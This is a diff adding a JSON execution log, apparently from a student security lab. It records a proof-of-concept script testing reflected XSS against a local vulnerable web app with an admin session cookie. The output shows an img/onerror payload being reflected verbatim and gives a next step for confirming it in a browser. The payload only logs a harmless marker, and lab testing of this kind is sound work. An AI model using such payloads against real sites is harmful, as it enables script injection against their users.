@@ -1,0 +1,28 @@
+{
+  "cmd": [
+    "C:\\Users\\12396\\.dsh\\dsh-runtimes\\dsh-primary-runtime\\dependencies\\python\\python.exe",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v3\\XSS-002__1.py",
+    "--base",
+    "http://127.0.0.1:9080",
+    "--path",
+    "/vulnerabilities/xss_r/",
+    "--cookie-file",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\followup\\sessions\\admin_medium.cookie"
+  ],
+  "started_at": "2026-10-20T14:43:26+08:00",
+  "returncode": 0,
+  "elapsed_seconds": 0.189,
+  "stdout": "request: GET http://127.0.0.1:9080/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3D%22console.log%28%60LLM_LAB_XSS%60%29%22%3E\r\nstatus: 200\r\npayload reflected verbatim: True\r\nmarker literal present: True\r\nnext step: open the printed URL in the browser and watch the devtools console for LLM_LAB_XSS\r\n",
+  "stderr": "",
+  "cohort": "v3",
+  "stem": "XSS-002__1",
+  "poc": "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v3\\XSS-002__1.py",
+  "args_redacted": [
+    "--base",
+    "http://127.0.0.1:9080",
+    "--path",
+    "/vulnerabilities/xss_r/",
+    "--cookie-file",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\followup\\sessions\\admin_medium.cookie"
+  ]
+}
